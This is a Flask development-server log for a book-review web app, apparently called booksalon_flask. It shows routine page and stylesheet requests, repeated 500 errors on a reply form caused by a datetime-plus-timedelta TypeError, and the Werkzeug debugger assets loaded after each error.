+124.49.105.89 - - [21/Oct/2020 06:51:42] "[37mGET /static/css/variables.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 06:51:42] "[37mGET /static/css/header.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 06:51:42] "[37mGET /static/css/bookinfo.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 06:51:42] "[37mGET /static/css/footer.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 06:52:40] "[37mGET /write HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 06:52:43] "[37mGET / HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 06:52:43] "[37mGET /static/css/style.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 06:52:43] "[37mGET /static/js/function.js HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 06:52:43] "[37mGET /static/css/reset.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 06:52:43] "[37mGET /static/css/write.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 06:52:43] "[37mGET /static/css/variables.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 06:52:43] "[37mGET /static/css/detail.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 06:52:43] "[37mGET /static/css/check.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 06:52:43] "[37mGET /static/css/header.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 06:52:43] "[37mGET /static/css/bookinfo.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 06:52:43] "[37mGET /static/css/footer.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 06:52:47] "[37mGET /detail?id=5f8fd97aed2f576a5da29a8c HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 06:52:47] "[37mGET /static/css/style.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 06:52:47] "[37mGET /static/css/reset.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 06:52:47] "[37mGET /static/css/variables.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 06:52:47] "[37mGET /static/css/write.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 06:52:47] "[37mGET /static/css/check.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 06:52:47] "[37mGET /static/css/detail.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 06:52:47] "[37mGET /static/css/header.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 06:52:47] "[37mGET /static/css/bookinfo.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 06:52:47] "[37mGET /static/css/footer.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 06:53:17] "[37mGET / HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 06:53:17] "[37mGET /static/css/style.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 06:53:17] "[37mGET /static/js/function.js HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 06:53:17] "[37mGET /static/css/reset.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 06:53:17] "[37mGET /static/css/write.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 06:53:17] "[37mGET /static/css/detail.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 06:53:17] "[37mGET /static/css/variables.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 06:53:17] "[37mGET /static/css/check.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 06:53:17] "[37mGET /static/css/header.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 06:53:17] "[37mGET /static/css/bookinfo.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 06:53:17] "[37mGET /static/css/footer.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 06:53:19] "[37mGET /detail?id=5f8fd97aed2f576a5da29a8c HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 06:53:19] "[37mGET /static/css/style.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 06:53:19] "[37mGET /static/css/reset.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 06:53:19] "[37mGET /static/css/variables.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 06:53:19] "[37mGET /static/css/detail.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 06:53:19] "[37mGET /static/css/write.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 06:53:19] "[37mGET /static/css/header.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 06:53:19] "[37mGET /static/css/check.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 06:53:19] "[37mGET /static/css/bookinfo.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 06:53:19] "[37mGET /static/css/footer.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 06:53:20] "[37mGET /checkpw?id=5f8fd97aed2f576a5da29a8c&type=q HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 06:53:20] "[37mGET /static/css/style.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 06:53:21] "[37mGET /static/css/reset.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 06:53:21] "[37mGET /static/css/variables.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 06:53:21] "[37mGET /static/css/write.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 06:53:21] "[37mGET /static/css/detail.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 06:53:21] "[37mGET /static/css/check.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 06:53:21] "[37mGET /static/css/header.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 06:53:21] "[37mGET /static/css/bookinfo.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 06:53:21] "[37mGET /static/css/footer.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 06:53:23] "[37mGET /detail?id=5f8fd97aed2f576a5da29a8c HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 06:53:23] "[37mGET /static/css/style.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 06:53:23] "[37mGET /static/css/reset.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 06:53:23] "[37mGET /static/css/write.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 06:53:23] "[37mGET /static/css/variables.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 06:53:23] "[37mGET /static/css/detail.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 06:53:23] "[37mGET /static/css/check.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 06:53:23] "[37mGET /static/css/header.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 06:53:23] "[37mGET /static/css/bookinfo.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 06:53:23] "[37mGET /static/css/footer.css HTTP/1.1[0m" 200 -
+211.36.145.121 - - [21/Oct/2020 06:54:59] "[37mGET / HTTP/1.1[0m" 200 -
+211.36.145.121 - - [21/Oct/2020 06:54:59] "[37mGET /static/css/style.css HTTP/1.1[0m" 200 -
+211.36.145.121 - - [21/Oct/2020 06:54:59] "[37mGET /static/js/function.js HTTP/1.1[0m" 200 -
+211.36.145.121 - - [21/Oct/2020 06:54:59] "[37mGET /static/css/reset.css HTTP/1.1[0m" 200 -
+211.36.145.121 - - [21/Oct/2020 06:54:59] "[37mGET /static/css/write.css HTTP/1.1[0m" 200 -
+211.36.145.121 - - [21/Oct/2020 06:54:59] "[37mGET /static/css/variables.css HTTP/1.1[0m" 200 -
+211.36.145.121 - - [21/Oct/2020 06:54:59] "[37mGET /static/css/check.css HTTP/1.1[0m" 200 -
+211.36.145.121 - - [21/Oct/2020 06:54:59] "[37mGET /static/css/detail.css HTTP/1.1[0m" 200 -
+211.36.145.121 - - [21/Oct/2020 06:54:59] "[37mGET /static/css/header.css HTTP/1.1[0m" 200 -
+211.36.145.121 - - [21/Oct/2020 06:54:59] "[37mGET /static/css/bookinfo.css HTTP/1.1[0m" 200 -
+211.36.145.121 - - [21/Oct/2020 06:54:59] "[37mGET /static/css/footer.css HTTP/1.1[0m" 200 -
+211.36.145.121 - - [21/Oct/2020 06:55:00] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+211.36.145.121 - - [21/Oct/2020 06:55:27] "[37mGET / HTTP/1.1[0m" 200 -
+211.36.145.121 - - [21/Oct/2020 06:55:27] "[37mGET /static/css/style.css HTTP/1.1[0m" 200 -
+211.36.145.121 - - [21/Oct/2020 06:55:27] "[37mGET /static/js/function.js HTTP/1.1[0m" 200 -
+211.36.145.121 - - [21/Oct/2020 06:55:27] "[37mGET /static/css/reset.css HTTP/1.1[0m" 200 -
+211.36.145.121 - - [21/Oct/2020 06:55:27] "[37mGET /static/css/write.css HTTP/1.1[0m" 200 -
+211.36.145.121 - - [21/Oct/2020 06:55:27] "[37mGET /static/css/detail.css HTTP/1.1[0m" 200 -
+211.36.145.121 - - [21/Oct/2020 06:55:27] "[37mGET /static/css/check.css HTTP/1.1[0m" 200 -
+211.36.145.121 - - [21/Oct/2020 06:55:27] "[37mGET /static/css/variables.css HTTP/1.1[0m" 200 -
+211.36.145.121 - - [21/Oct/2020 06:55:27] "[37mGET /static/css/header.css HTTP/1.1[0m" 200 -
+211.36.145.121 - - [21/Oct/2020 06:55:27] "[37mGET /static/css/footer.css HTTP/1.1[0m" 200 -
+211.36.145.121 - - [21/Oct/2020 06:55:27] "[37mGET /static/css/bookinfo.css HTTP/1.1[0m" 200 -
+211.36.145.121 - - [21/Oct/2020 06:55:28] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+211.36.145.121 - - [21/Oct/2020 06:55:31] "[37mGET /detail?id=5f8fd97aed2f576a5da29a8c HTTP/1.1[0m" 200 -
+211.36.145.121 - - [21/Oct/2020 06:55:36] "[37mGET /detail?id=5f8fd97aed2f576a5da29a8c HTTP/1.1[0m" 200 -
+211.36.145.121 - - [21/Oct/2020 06:56:33] "[35m[1mPOST /write_reply?id=5f8fd97aed2f576a5da29a8c HTTP/1.1[0m" 500 -
+Traceback (most recent call last):
+  File "/home/ubuntu/.local/share/virtualenvs/booksalon_flask-0AKjrcsX/lib/python3.6/site-packages/flask/app.py", line 2464, in __call__
+    return self.wsgi_app(environ, start_response)
+  File "/home/ubuntu/.local/share/virtualenvs/booksalon_flask-0AKjrcsX/lib/python3.6/site-packages/flask/app.py", line 2450, in wsgi_app
+    response = self.handle_exception(e)
+  File "/home/ubuntu/.local/share/virtualenvs/booksalon_flask-0AKjrcsX/lib/python3.6/site-packages/flask/app.py", line 1867, in handle_exception
+    reraise(exc_type, exc_value, tb)
+  File "/home/ubuntu/.local/share/virtualenvs/booksalon_flask-0AKjrcsX/lib/python3.6/site-packages/flask/_compat.py", line 39, in reraise
+    raise value
+  File "/home/ubuntu/.local/share/virtualenvs/booksalon_flask-0AKjrcsX/lib/python3.6/site-packages/flask/app.py", line 2447, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/home/ubuntu/.local/share/virtualenvs/booksalon_flask-0AKjrcsX/lib/python3.6/site-packages/flask/app.py", line 1952, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/home/ubuntu/.local/share/virtualenvs/booksalon_flask-0AKjrcsX/lib/python3.6/site-packages/flask/app.py", line 1821, in handle_user_exception
+    reraise(exc_type, exc_value, tb)
+  File "/home/ubuntu/.local/share/virtualenvs/booksalon_flask-0AKjrcsX/lib/python3.6/site-packages/flask/_compat.py", line 39, in reraise
+    raise value
+  File "/home/ubuntu/.local/share/virtualenvs/booksalon_flask-0AKjrcsX/lib/python3.6/site-packages/flask/app.py", line 1950, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/home/ubuntu/.local/share/virtualenvs/booksalon_flask-0AKjrcsX/lib/python3.6/site-packages/flask/app.py", line 1936, in dispatch_request
+    return self.view_functions[rule.endpoint](**req.view_args)
+  File "/home/ubuntu/booksalon_flask/app.py", line 65, in write_reply
+    reply_time = datetime.now() + timedelta
+TypeError: unsupported operand type(s) for +: 'datetime.datetime' and 'type'
+211.36.145.121 - - [21/Oct/2020 06:56:34] "[37mGET /write_reply?__debugger__=yes&cmd=resource&f=jquery.js HTTP/1.1[0m" 200 -
+211.36.145.121 - - [21/Oct/2020 06:56:34] "[37mGET /write_reply?__debugger__=yes&cmd=resource&f=style.css HTTP/1.1[0m" 200 -
+211.36.145.121 - - [21/Oct/2020 06:56:34] "[37mGET /write_reply?__debugger__=yes&cmd=resource&f=debugger.js HTTP/1.1[0m" 200 -
+211.36.145.121 - - [21/Oct/2020 06:56:34] "[37mGET /write_reply?__debugger__=yes&cmd=resource&f=ubuntu.ttf HTTP/1.1[0m" 200 -
+211.36.145.121 - - [21/Oct/2020 06:56:34] "[37mGET /write_reply?__debugger__=yes&cmd=resource&f=console.png HTTP/1.1[0m" 200 -
+211.36.145.121 - - [21/Oct/2020 06:56:34] "[37mGET /write_reply?__debugger__=yes&cmd=resource&f=console.png HTTP/1.1[0m" 200 -
+211.36.145.121 - - [21/Oct/2020 06:56:39] "[35m[1mPOST /write_reply?id=5f8fd97aed2f576a5da29a8c HTTP/1.1[0m" 500 -
+Traceback (most recent call last):
+  File "/home/ubuntu/.local/share/virtualenvs/booksalon_flask-0AKjrcsX/lib/python3.6/site-packages/flask/app.py", line 2464, in __call__
+    return self.wsgi_app(environ, start_response)
+  File "/home/ubuntu/.local/share/virtualenvs/booksalon_flask-0AKjrcsX/lib/python3.6/site-packages/flask/app.py", line 2450, in wsgi_app
+    response = self.handle_exception(e)
+  File "/home/ubuntu/.local/share/virtualenvs/booksalon_flask-0AKjrcsX/lib/python3.6/site-packages/flask/app.py", line 1867, in handle_exception
+    reraise(exc_type, exc_value, tb)
+  File "/home/ubuntu/.local/share/virtualenvs/booksalon_flask-0AKjrcsX/lib/python3.6/site-packages/flask/_compat.py", line 39, in reraise
+    raise value
+  File "/home/ubuntu/.local/share/virtualenvs/booksalon_flask-0AKjrcsX/lib/python3.6/site-packages/flask/app.py", line 2447, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/home/ubuntu/.local/share/virtualenvs/booksalon_flask-0AKjrcsX/lib/python3.6/site-packages/flask/app.py", line 1952, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/home/ubuntu/.local/share/virtualenvs/booksalon_flask-0AKjrcsX/lib/python3.6/site-packages/flask/app.py", line 1821, in handle_user_exception
+    reraise(exc_type, exc_value, tb)
+  File "/home/ubuntu/.local/share/virtualenvs/booksalon_flask-0AKjrcsX/lib/python3.6/site-packages/flask/_compat.py", line 39, in reraise
+    raise value
+  File "/home/ubuntu/.local/share/virtualenvs/booksalon_flask-0AKjrcsX/lib/python3.6/site-packages/flask/app.py", line 1950, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/home/ubuntu/.local/share/virtualenvs/booksalon_flask-0AKjrcsX/lib/python3.6/site-packages/flask/app.py", line 1936, in dispatch_request
+    return self.view_functions[rule.endpoint](**req.view_args)
+  File "/home/ubuntu/booksalon_flask/app.py", line 65, in write_reply
+    reply_time = datetime.now() + timedelta
+TypeError: unsupported operand type(s) for +: 'datetime.datetime' and 'type'
+211.36.145.121 - - [21/Oct/2020 06:56:40] "[37mGET /write_reply?__debugger__=yes&cmd=resource&f=style.css HTTP/1.1[0m" 200 -
+211.36.145.121 - - [21/Oct/2020 06:56:40] "[37mGET /write_reply?__debugger__=yes&cmd=resource&f=debugger.js HTTP/1.1[0m" 200 -
+211.36.145.121 - - [21/Oct/2020 06:56:40] "[37mGET /write_reply?__debugger__=yes&cmd=resource&f=jquery.js HTTP/1.1[0m" 200 -
+211.36.145.121 - - [21/Oct/2020 06:56:40] "[37mGET /write_reply?__debugger__=yes&cmd=resource&f=ubuntu.ttf HTTP/1.1[0m" 200 -
+211.36.145.121 - - [21/Oct/2020 06:56:40] "[37mGET /write_reply?__debugger__=yes&cmd=resource&f=console.png HTTP/1.1[0m" 200 -
+211.36.145.121 - - [21/Oct/2020 06:56:40] "[37mGET /write_reply?__debugger__=yes&cmd=resource&f=console.png HTTP/1.1[0m" 200 -
+211.36.145.121 - - [21/Oct/2020 06:56:49] "[35m[1mPOST /write_reply?id=5f8fd97aed2f576a5da29a8c HTTP/1.1[0m" 500 -
+Traceback (most recent call last):
+  File "/home/ubuntu/.local/share/virtualenvs/booksalon_flask-0AKjrcsX/lib/python3.6/site-packages/flask/app.py", line 2464, in __call__
+    return self.wsgi_app(environ, start_response)
+  File "/home/ubuntu/.local/share/virtualenvs/booksalon_flask-0AKjrcsX/lib/python3.6/site-packages/flask/app.py", line 2450, in wsgi_app
+    response = self.handle_exception(e)
+  File "/home/ubuntu/.local/share/virtualenvs/booksalon_flask-0AKjrcsX/lib/python3.6/site-packages/flask/app.py", line 1867, in handle_exception
+    reraise(exc_type, exc_value, tb)
+  File "/home/ubuntu/.local/share/virtualenvs/booksalon_flask-0AKjrcsX/lib/python3.6/site-packages/flask/_compat.py", line 39, in reraise
+    raise value
+  File "/home/ubuntu/.local/share/virtualenvs/booksalon_flask-0AKjrcsX/lib/python3.6/site-packages/flask/app.py", line 2447, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/home/ubuntu/.local/share/virtualenvs/booksalon_flask-0AKjrcsX/lib/python3.6/site-packages/flask/app.py", line 1952, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/home/ubuntu/.local/share/virtualenvs/booksalon_flask-0AKjrcsX/lib/python3.6/site-packages/flask/app.py", line 1821, in handle_user_exception
+    reraise(exc_type, exc_value, tb)
+  File "/home/ubuntu/.local/share/virtualenvs/booksalon_flask-0AKjrcsX/lib/python3.6/site-packages/flask/_compat.py", line 39, in reraise
+    raise value
+  File "/home/ubuntu/.local/share/virtualenvs/booksalon_flask-0AKjrcsX/lib/python3.6/site-packages/flask/app.py", line 1950, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/home/ubuntu/.local/share/virtualenvs/booksalon_flask-0AKjrcsX/lib/python3.6/site-packages/flask/app.py", line 1936, in dispatch_request
+    return self.view_functions[rule.endpoint](**req.view_args)
+  File "/home/ubuntu/booksalon_flask/app.py", line 65, in write_reply
+    reply_time = datetime.now() + timedelta
+TypeError: unsupported operand type(s) for +: 'datetime.datetime' and 'type'
+211.36.145.121 - - [21/Oct/2020 06:56:50] "[37mGET /write_reply?__debugger__=yes&cmd=resource&f=jquery.js HTTP/1.1[0m" 200 -
+211.36.145.121 - - [21/Oct/2020 06:56:50] "[37mGET /write_reply?__debugger__=yes&cmd=resource&f=style.css HTTP/1.1[0m" 200 -
+211.36.145.121 - - [21/Oct/2020 06:56:50] "[37mGET /write_reply?__debugger__=yes&cmd=resource&f=debugger.js HTTP/1.1[0m" 200 -
+211.36.145.121 - - [21/Oct/2020 06:56:50] "[37mGET /write_reply?__debugger__=yes&cmd=resource&f=ubuntu.ttf HTTP/1.1[0m" 200 -
+211.36.145.121 - - [21/Oct/2020 06:56:50] "[37mGET /write_reply?__debugger__=yes&cmd=resource&f=console.png HTTP/1.1[0m" 200 -
+211.36.145.121 - - [21/Oct/2020 06:56:50] "[37mGET /write_reply?__debugger__=yes&cmd=resource&f=console.png HTTP/1.1[0m" 200 -
+211.36.145.121 - - [21/Oct/2020 06:57:02] "[35m[1mPOST /write_reply?id=5f8fd97aed2f576a5da29a8c HTTP/1.1[0m" 500 -
+Traceback (most recent call last):
+  File "/home/ubuntu/.local/share/virtualenvs/booksalon_flask-0AKjrcsX/lib/python3.6/site-packages/flask/app.py", line 2464, in __call__
+    return self.wsgi_app(environ, start_response)
+  File "/home/ubuntu/.local/share/virtualenvs/booksalon_flask-0AKjrcsX/lib/python3.6/site-packages/flask/app.py", line 2450, in wsgi_app
+    response = self.handle_exception(e)
+  File "/home/ubuntu/.local/share/virtualenvs/booksalon_flask-0AKjrcsX/lib/python3.6/site-packages/flask/app.py", line 1867, in handle_exception
+    reraise(exc_type, exc_value, tb)
+  File "/home/ubuntu/.local/share/virtualenvs/booksalon_flask-0AKjrcsX/lib/python3.6/site-packages/flask/_compat.py", line 39, in reraise
+    raise value
+  File "/home/ubuntu/.local/share/virtualenvs/booksalon_flask-0AKjrcsX/lib/python3.6/site-packages/flask/app.py", line 2447, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/home/ubuntu/.local/share/virtualenvs/booksalon_flask-0AKjrcsX/lib/python3.6/site-packages/flask/app.py", line 1952, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/home/ubuntu/.local/share/virtualenvs/booksalon_flask-0AKjrcsX/lib/python3.6/site-packages/flask/app.py", line 1821, in handle_user_exception
+    reraise(exc_type, exc_value, tb)
+  File "/home/ubuntu/.local/share/virtualenvs/booksalon_flask-0AKjrcsX/lib/python3.6/site-packages/flask/_compat.py", line 39, in reraise
+    raise value
+  File "/home/ubuntu/.local/share/virtualenvs/booksalon_flask-0AKjrcsX/lib/python3.6/site-packages/flask/app.py", line 1950, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/home/ubuntu/.local/share/virtualenvs/booksalon_flask-0AKjrcsX/lib/python3.6/site-packages/flask/app.py", line 1936, in dispatch_request
+    return self.view_functions[rule.endpoint](**req.view_args)
+  File "/home/ubuntu/booksalon_flask/app.py", line 65, in write_reply
+    reply_time = datetime.now() + timedelta
+TypeError: unsupported operand type(s) for +: 'datetime.datetime' and 'type'
+211.36.145.121 - - [21/Oct/2020 06:57:02] "[37mGET /write_reply?__debugger__=yes&cmd=resource&f=style.css HTTP/1.1[0m" 200 -
+211.36.145.121 - - [21/Oct/2020 06:57:02] "[37mGET /write_reply?__debugger__=yes&cmd=resource&f=debugger.js HTTP/1.1[0m" 200 -
+211.36.145.121 - - [21/Oct/2020 06:57:02] "[37mGET /write_reply?__debugger__=yes&cmd=resource&f=jquery.js HTTP/1.1[0m" 200 -
+211.36.145.121 - - [21/Oct/2020 06:57:03] "[37mGET /write_reply?__debugger__=yes&cmd=resource&f=ubuntu.ttf HTTP/1.1[0m" 200 -
+211.36.145.121 - - [21/Oct/2020 06:57:03] "[37mGET /write_reply?__debugger__=yes&cmd=resource&f=console.png HTTP/1.1[0m" 200 -
+211.36.145.121 - - [21/Oct/2020 06:57:03] "[37mGET /write_reply?__debugger__=yes&cmd=resource&f=console.png HTTP/1.1[0m" 200 -
+211.36.145.121 - - [21/Oct/2020 06:57:09] "[37mGET / HTTP/1.1[0m" 200 -
+211.36.145.121 - - [21/Oct/2020 06:57:09] "[37mGET /static/js/function.js HTTP/1.1[0m" 200 -
+211.36.145.121 - - [21/Oct/2020 06:57:09] "[37mGET /static/css/style.css HTTP/1.1[0m" 200 -
+211.36.145.121 - - [21/Oct/2020 06:57:09] "[37mGET /static/css/write.css HTTP/1.1[0m" 200 -
+211.36.145.121 - - [21/Oct/2020 06:57:09] "[37mGET /static/css/detail.css HTTP/1.1[0m" 200 -
+211.36.145.121 - - [21/Oct/2020 06:57:09] "[37mGET /static/css/reset.css HTTP/1.1[0m" 200 -
+211.36.145.121 - - [21/Oct/2020 06:57:09] "[37mGET /static/css/variables.css HTTP/1.1[0m" 200 -
+211.36.145.121 - - [21/Oct/2020 06:57:09] "[37mGET /static/css/check.css HTTP/1.1[0m" 200 -
+211.36.145.121 - - [21/Oct/2020 06:57:09] "[37mGET /static/css/header.css HTTP/1.1[0m" 200 -
+211.36.145.121 - - [21/Oct/2020 06:57:09] "[37mGET /static/css/bookinfo.css HTTP/1.1[0m" 200 -
+211.36.145.121 - - [21/Oct/2020 06:57:09] "[37mGET /static/css/footer.css HTTP/1.1[0m" 200 -
+211.36.145.121 - - [21/Oct/2020 06:57:10] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+211.36.145.121 - - [21/Oct/2020 06:57:14] "[37mGET /detail?id=5f8fd97aed2f576a5da29a8c HTTP/1.1[0m" 200 -
+211.36.145.121 - - [21/Oct/2020 06:57:25] "[35m[1mPOST /write_reply?id=5f8fd97aed2f576a5da29a8c HTTP/1.1[0m" 500 -
+Traceback (most recent call last):
+  File "/home/ubuntu/.local/share/virtualenvs/booksalon_flask-0AKjrcsX/lib/python3.6/site-packages/flask/app.py", line 2464, in __call__
+    return self.wsgi_app(environ, start_response)
+  File "/home/ubuntu/.local/share/virtualenvs/booksalon_flask-0AKjrcsX/lib/python3.6/site-packages/flask/app.py", line 2450, in wsgi_app
+    response = self.handle_exception(e)
+  File "/home/ubuntu/.local/share/virtualenvs/booksalon_flask-0AKjrcsX/lib/python3.6/site-packages/flask/app.py", line 1867, in handle_exception
+    reraise(exc_type, exc_value, tb)
+  File "/home/ubuntu/.local/share/virtualenvs/booksalon_flask-0AKjrcsX/lib/python3.6/site-packages/flask/_compat.py", line 39, in reraise
+    raise value
+  File "/home/ubuntu/.local/share/virtualenvs/booksalon_flask-0AKjrcsX/lib/python3.6/site-packages/flask/app.py", line 2447, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/home/ubuntu/.local/share/virtualenvs/booksalon_flask-0AKjrcsX/lib/python3.6/site-packages/flask/app.py", line 1952, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/home/ubuntu/.local/share/virtualenvs/booksalon_flask-0AKjrcsX/lib/python3.6/site-packages/flask/app.py", line 1821, in handle_user_exception
+    reraise(exc_type, exc_value, tb)
+  File "/home/ubuntu/.local/share/virtualenvs/booksalon_flask-0AKjrcsX/lib/python3.6/site-packages/flask/_compat.py", line 39, in reraise
+    raise value
+  File "/home/ubuntu/.local/share/virtualenvs/booksalon_flask-0AKjrcsX/lib/python3.6/site-packages/flask/app.py", line 1950, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/home/ubuntu/.local/share/virtualenvs/booksalon_flask-0AKjrcsX/lib/python3.6/site-packages/flask/app.py", line 1936, in dispatch_request
+    return self.view_functions[rule.endpoint](**req.view_args)
+  File "/home/ubuntu/booksalon_flask/app.py", line 65, in write_reply
+    reply_time = datetime.now() + timedelta
+TypeError: unsupported operand type(s) for +: 'datetime.datetime' and 'type'
+211.36.145.121 - - [21/Oct/2020 06:57:25] "[37mGET /write_reply?__debugger__=yes&cmd=resource&f=jquery.js HTTP/1.1[0m" 200 -
+211.36.145.121 - - [21/Oct/2020 06:57:25] "[37mGET /write_reply?__debugger__=yes&cmd=resource&f=style.css HTTP/1.1[0m" 200 -
+211.36.145.121 - - [21/Oct/2020 06:57:25] "[37mGET /write_reply?__debugger__=yes&cmd=resource&f=debugger.js HTTP/1.1[0m" 200 -
+211.36.145.121 - - [21/Oct/2020 06:57:26] "[37mGET /write_reply?__debugger__=yes&cmd=resource&f=ubuntu.ttf HTTP/1.1[0m" 200 -
+211.36.145.121 - - [21/Oct/2020 06:57:26] "[37mGET /write_reply?__debugger__=yes&cmd=resource&f=console.png HTTP/1.1[0m" 200 -
+211.36.145.121 - - [21/Oct/2020 06:57:26] "[37mGET /write_reply?__debugger__=yes&cmd=resource&f=console.png HTTP/1.1[0m" 200 -
+211.36.145.121 - - [21/Oct/2020 06:57:38] "[37mGET / HTTP/1.1[0m" 200 -
+211.36.145.121 - - [21/Oct/2020 06:57:38] "[37mGET /static/css/style.css HTTP/1.1[0m" 200 -
+211.36.145.121 - - [21/Oct/2020 06:57:38] "[37mGET /static/js/function.js HTTP/1.1[0m" 200 -
+211.36.145.121 - - [21/Oct/2020 06:57:38] "[37mGET /static/css/reset.css HTTP/1.1[0m" 200 -
+211.36.145.121 - - [21/Oct/2020 06:57:38] "[37mGET /static/css/write.css HTTP/1.1[0m" 200 -
+211.36.145.121 - - [21/Oct/2020 06:57:38] "[37mGET /static/css/detail.css HTTP/1.1[0m" 200 -
+211.36.145.121 - - [21/Oct/2020 06:57:38] "[37mGET /static/css/variables.css HTTP/1.1[0m" 200 -
+211.36.145.121 - - [21/Oct/2020 06:57:38] "[37mGET /static/css/check.css HTTP/1.1[0m" 200 -
+211.36.145.121 - - [21/Oct/2020 06:57:38] "[37mGET /static/css/header.css HTTP/1.1[0m" 200 -
+211.36.145.121 - - [21/Oct/2020 06:57:38] "[37mGET /static/css/bookinfo.css HTTP/1.1[0m" 200 -
+211.36.145.121 - - [21/Oct/2020 06:57:38] "[37mGET /static/css/footer.css HTTP/1.1[0m" 200 -
+121.53.84.12 - - [21/Oct/2020 06:57:38] "[37mGET / HTTP/1.1[0m" 200 -
+211.36.145.121 - - [21/Oct/2020 06:57:38] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+211.36.145.121 - - [21/Oct/2020 06:57:40] "[37mGET /write HTTP/1.1[0m" 200 -
+211.36.145.121 - - [21/Oct/2020 06:58:19] "[37mGET / HTTP/1.1[0m" 200 -
